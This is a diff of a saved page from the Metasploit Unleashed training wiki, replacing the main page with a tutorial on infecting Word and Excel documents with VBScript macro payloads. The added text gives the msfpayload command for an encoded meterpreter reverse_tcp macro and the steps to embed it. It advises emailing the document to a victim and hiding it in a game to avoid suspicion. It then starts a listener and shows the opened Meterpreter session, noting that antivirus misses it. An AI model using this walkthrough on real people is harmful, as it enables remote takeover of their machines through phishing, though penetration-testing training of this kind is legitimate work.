@@ -2,7 +2,7 @@
 		<!DOCTYPE html>
 		<html xmlns="" xml:lang="en" lang="en" dir="ltr">
 		<head>
-			<title>Metasploit Unleashed</title>
+			<title>VBScript Infection Methods - Metasploit Unleashed</title>
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/reset.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/style.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/main.css" />
@@ -25,10 +25,10 @@
 						
 						<div id="controls">
 									<ul>
-			<li id="ca-nstab-main" class="selected"><a href="Port_Scanners" title="View the content page [c]" accesskey="c">Page</a></li>
-			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Main_Page&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
-			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
-			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
+			<li id="ca-nstab-main" class="selected"><a href="VBScript_Infection_Methods" title="View the content page [c]" accesskey="c">Page</a></li>
+			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:VBScript_Infection_Methods&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
+			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=VBScript_Infection_Methods&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
+			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=VBScript_Infection_Methods&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
 		</ul>
 							
 							<div class="portlet" id="p-personal">
@@ -57,36 +57,246 @@
 						<a id="top"></a>
 						
 						<div id="content">
-							<h1>Metasploit Unleashed</h1>
+							<h1>VBScript Infection Methods</h1>
 						
 							<div id="siteSub">From Metasploit Unleashed</div>
 							<div id="contentSub"></div>
-																													<div id="jump-to-nav">Jump to: <a href="Port_Scanners#column-one">navigation</a>, <a href="Port_Scanners#searchInput">search</a></div>
+																													<div id="jump-to-nav">Jump to: <a href="VBScript_Infection_Methods#column-one">navigation</a>, <a href="VBScript_Infection_Methods#searchInput">search</a></div>
 														<!-- start content -->
-							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>This free information security training is brought to you in a community effort to promote awareness and raise funds for underprivileged children in East Africa. Through a heart-warming effort by several security professionals, we are proud to present the most complete and in-depth open course about the Metasploit Framework.
+							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>Metasploit has a couple of built in methods you can use to infect Word and Excel documents with malicious Metasploit payloads. You can also use your own custom payloads as well. It doesn't necessarily need to be a Metasploit payload.  This method is useful when going after client-side attacks and could also be potentially useful if you have to bypass some sort of filtering that does not allow executables and only permits documents to pass through. To begin, we first need to create our VBScript payload.
+<br />
+<br />
+<pre><span style='color:#ff0000;'>root@kali</span>: # <span style='color:#13C16A;'>msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=8080 ENCODING=shikata_ga_nai V</span>           
+Created by msfpayload (http://www.metasploit.com).
+Payload: windows/meterpreter/reverse_tcp
+ Length: 290
+Options: LHOST=192.168.1.101,LPORT=8080,ENCODING=shikata_ga_nai
+
+**************************************************************
+*
+* This code is now split into two pieces:
+*  1. The Macro. This must be copied into the Office document
+*     macro editor. This macro will run on startup.
+*
+*  2. The Data. The hex dump at the end of this output must be
+*     appended to the end of the document contents.
+<span style='color:#00ff00;'>...snip...</span></pre>
+<br />
+<br />
+As the output message, indicates, the script is in 2 parts. The first part of the script is created as a macro and the second part is appended into the document text itself. You will need to transfer this script over to a machine with Windows and Office installed and perform the following:
+<br />
+<br />
+<pre>Word/Excel 2003: Tools -> Macros -> Visual Basic Editor
+Word/Excel 2007: View Macros -> then place a name like "moo" and select "create".</pre>
+<br />
+This will open up the visual basic editor. Paste the output of the first portion of the payload script into the editor, save it and then paste the remainder of the script into thel word document itself.  This is when you would perform the client-side attack by emailing this Word document to someone.
+<br />
+<br />
+In order to keep user suspicion low, try embedding the code in one of the many Word/Excel games that are available on the Internet.  That way, the user is happily playing the game while you are working in the background.  This gives you some extra time to migrate to another process if you are using Meterpreter as a payload.
 <br />
 <br />
 </p>
-<div class="center"><div class="floatnone"><a href="File:Msfu_logo_3.png" class="image"><img alt="Msfu logo 3.png" src="http://www.offensive-security.com/w/images/f/f6/Msfu_logo_3.png" width="632" height="319" /></a></div></div>
+<div class="center"><div class="floatnone"><a href="File:Vbscript_01.png" class="image"><img alt="Vbscript 01.png" src="http://www.offensive-security.com/w/images/7/7d/Vbscript_01.png" width="448" height="367" /></a></div></div>
 <p><br />
 <br />
-This is a free online course and if you enjoy it and find it useful, we ask that you make a donation to the HFC (Hackers For Charity), $9.00 will feed a child for a month, so any contribution is welcome. We hope you enjoy this course as much as we enjoyed making it.
+Here we give a generic name to the macro.
 <br />
+<br />
+</p>
+<div class="center"><div class="floatnone"><a href="File:Vbscript_02.png" class="image"><img alt="Vbscript 02.png" src="http://www.offensive-security.com/w/images/b/b8/Vbscript_02.png" width="888" height="554" /></a></div></div>
+<p><br />
+<br />
+Before we send off our malicious document to our victim, we first need to set up our Metasploit listener.
+<br />
+<br />
+<pre><span style='color:#ff0000;'>root@kali</span>:# <span style='color:#13C16A;'>msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=8080 E</span>
+
+  <span style='color:#00ffff;'>              ##                          ###           ##    ##
+ ##  ##  #### ###### ####  #####   #####    ##    ####        ######
+####### ##  ##  ##  ##         ## ##  ##    ##   ##  ##   ###   ##
+####### ######  ##  #####   ####  ##  ##    ##   ##  ##   ##    ##
+## # ##     ##  ##  ##  ## ##      #####    ##   ##  ##   ##    ##
+##   ##  #### ###   #####   #####     ##   ####   ####   #### ###
+                                      ##</span>
+
+
+       =[ metasploit v4.2.0-dev [core:4.2 api:1.0]
++ -- --=[ 787 exploits - 425 auxiliary - 128 post
++ -- --=[ 238 payloads - 27 encoders - 8 nops
+       =[ svn r14551 updated yesterday (2012.01.14)
+
+PAYLOAD => windows/meterpreter/reverse_tcp
+LHOST => 192.168.1.101
+LPORT => 8080
+<span style='color:#0000FF;'>[*]</span> Started reverse handler on 192.168.1.101:8080 
+<span style='color:#0000FF;'>[*]</span> Starting the payload handler...</pre>
+<br />
+Now we can test out the document by opening it up and check back to where we have our Metasploit exploit/multi/handler listener:
+<br />
+<br />
+<pre><span style='color:#0000FF;'>[*]</span> Sending stage (749056 bytes) to 192.168.1.150
+<span style='color:#0000FF;'>[*]</span> Meterpreter session 1 opened (192.168.1.101:8080 -> 192.168.1.150:52465) at Thu Nov 25 16:54:29 -0700 2010
+
+<u>meterpreter</u> > <span style='color:#13C16A;'>sysinfo</span>
+Computer: XEN-WIN7-PROD
+OS      : Windows 7 (Build 7600, ).
+Arch    : x64 (Current Process is WOW64)
+Language: en_US
+<u>meterpreter</u> > <span style='color:#13C16A;'>getuid</span>
+Server username: xen-win7-prod\dookie
+<u>meterpreter</u> ></pre>
+<br />
+Success! We have a Meterpreter shell right to the system that opened the document, and best of all, it doesn't get picked up by anti-virus!!!
+<br />
+</p>
+<hr />
+<p><br />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 </p>
 <!-- 
 NewPP limit report
-Preprocessor visited node count: 6/1000000
-Preprocessor generated node count: 20/1000000
-Post‐expand include size: 0/2097152 bytes
+Preprocessor visited node count: 519/1000000
+Preprocessor generated node count: 2689/1000000
+Post‐expand include size: 4268/2097152 bytes
 Template argument size: 0/2097152 bytes
-Highest expansion depth: 2/40
+Highest expansion depth: 3/40
 Expensive parser function count: 0/100
 -->
 
-<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:285-0!*!*!*!*!2!* and timestamp 20131123153816 -->
+<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:56-0!*!*!*!*!2!* and timestamp 20131123183854 -->
 </div><div class="printfooter">
-Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597">http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597</a>"</div>
-							<div id='catlinks' class='catlinks catlinks-allhidden'></div>							<!-- end content -->
+Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=VBScript_Infection_Methods&amp;oldid=1528">http://www.offensive-security.com/w/index.php?title=VBScript_Infection_Methods&amp;oldid=1528</a>"</div>
+							<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks" class="mw-normal-catlinks"><a href="Special:Categories" title="Special:Categories">Category</a>: <ul><li><a href="http://www.offensive-security.com/w/index.php?title=Category:Client_Side_Exploits&amp;action=edit&amp;redlink=1" class="new" title="Category:Client Side Exploits (page does not exist)">Client Side Exploits</a></li></ul></div></div>							<!-- end content -->
 													</div>
 						
 					</div>
@@ -521,4 +731,4 @@ document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.
 <script type="text/javascript">
 var pageTracker = _gat._getTracker("UA-1981501-1");
 pageTracker._trackPageview();
-</script><!-- Served in 0.151 secs. --></body></html>
+</script><!-- Served in 0.139 secs. --></body></html>
